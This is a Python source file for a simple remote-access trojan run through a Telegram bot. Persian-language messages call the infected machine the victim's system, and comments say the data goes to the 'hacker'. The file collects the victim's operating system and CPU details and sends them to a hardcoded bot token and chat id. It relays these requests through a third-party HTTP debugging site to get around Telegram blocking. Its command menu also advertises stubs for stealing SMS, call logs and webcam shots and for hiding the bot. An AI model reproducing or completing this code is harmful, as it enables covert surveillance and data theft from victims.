# >>>>>>>>>>>>>>>>>>> imports <<<<<<<<<<<<<<<<<<
import requests
import time
import platform
import os
from colorama import Fore
import wmi
import subprocess
import json
from bs4 import BeautifulSoup
# >>>>>>>>>>>>>>>>>>> inputs / bot <<<<<<<<<<<<<<<<<<
last_key = ""
token = "6459692570:AAEwHoQvu764AZaljodvTKT6uYNhcvZDir4"
chat_id = "1732975558"
# >>>>>>>>>>>>>>>>>>> start <<<<<<<<<<<<<<<<<<

def send_msg(msg): # for send data for hacker
    try:
        url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text="+str(msg))
        
        payload = {
            "UrlBox":url,
            "AgentList":"Internet Explorer",
            "VersionsList":"HTTP/1.1",
            "MethodList":"GET"  
        }
        
        http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" , payload) # telegram baypass link for send requests
    except(KeyboardInterrupt):
        exit("Exit")
def sys_info(): # get information system target
    try:
        os_info = platform.uname()[0]
        os_ver = platform.uname()[2]
        cpu_info = subprocess.getoutput("wmic cpu get name").replace("Name","").replace("\n","").replace(" ","").replace("\n","")
        out_msg = f"""
    اطلاعات سیستم قربانی ‼️

    💻 نام سیستم عامل : {os_info}

    ⚙️ ورژن سیستم عامل : {os_ver}

    🔌 مشخصات CPU :  {cpu_info}

    برای مخفی ماندن😉 روی /hide کلیک کنید ✅
    ⚙️ تمامی امکانات : /lists
        """
        
        send_msg(out_msg)
        with open("log.txt", "w") as f:
            f.write("OS-name : = " + os_info+os_ver + "\nCPU-Info : = "+cpu_info)
            f.close()
        time.sleep(10)
    except(KeyboardInterrupt):
        exit("Exit")
def get_key(): # get keys in bot cliced  
    try: 
        maydata = {
            "UrlBox":f"https://api.telegram.org/bot{token}/Getupdates",
            "AgentList":"Internet Explorer",
            "VersionsList":"HTTP/1.1",
            "MethodList":"GET"
        }
        http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" ,data=maydata).content.decode()

        souap = BeautifulSoup(http , "html.parser")

        find_tag = json.loads(str(souap("pre"))[61:-7])

        key_enter = find_tag['result'][-1]['message']['text']
        
        if key_enter == "/last_sms":
            pass
        elif key_enter == "/system_info":
            sys_info()
        elif key_enter == "/last_call":
            pass
        elif key_enter == "/webcam_shot":
            pass
        elif key_enter == "/hide":
            hide_sys()
        elif key_enter == "/all_sys":
            pass
        elif key_enter == "/lists":
            lists()
        else:
            url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text="+str("/hide"))
        
        #     payload = {
        #     "UrlBox":url,
        #     "AgentList":"Internet Explorer",
        #     "VersionsList":"HTTP/1.1",
        #     "MethodList":"GET"  
        # }
        time.sleep(5)
        # http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" , payload)  
    except(KeyboardInterrupt):
        exit("Exit")    
def lists(): #
    try:
        pm ="""
        امکانات ربات ✅

    ✉️ دریافت ۵ پیام آخر : /last_sms

    📞 دریافت ۵ تماس آخر : /last_call

    💻 اطلاعات سیستم : /system_info

    📸 دوربین جلو : /webcam_shot

    📱 سی ام دی : /all_sys 

    برای مخفی ماندن😉 روی /hide کلیک کنید ✅
        """
        send_msg(pm)
        time.sleep(5)
    except(KeyboardInterrupt):
        exit("Exit")
def hide_sys(): # for hide in client
    try:
        while True:
                maydata = {
                    "UrlBox":f"https://api.telegram.org/bot{token}/Getupdates",
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"
                }
                http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx" ,data=maydata).content.decode()

                souap = BeautifulSoup(http , "html.parser")

                find_tag = json.loads(str(souap("pre"))[61:-7])

                key_enter = find_tag['result'][-1]['message']['text']
                
                if key_enter == "/last_sms":
                    pass
                elif key_enter == "/system_info":
                    sys_info()
                elif key_enter == "/last_call":
                    pass
                elif key_enter == "/webcam_shot":
                    pass
                elif key_enter == "/hide":
                    hide_sys()
                elif key_enter == "/all_sys":
                    pass
                elif key_enter == "/lists":
                    lists()
                else:
                    url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text="+str("/hide"))
    except(KeyboardInterrupt):
        exit("Exit")   
try:                     
    sys_info()
    time.sleep(5)
    while True:
        get_key()
        sys_info()
except(KeyboardInterrupt):
    exit("Exit")    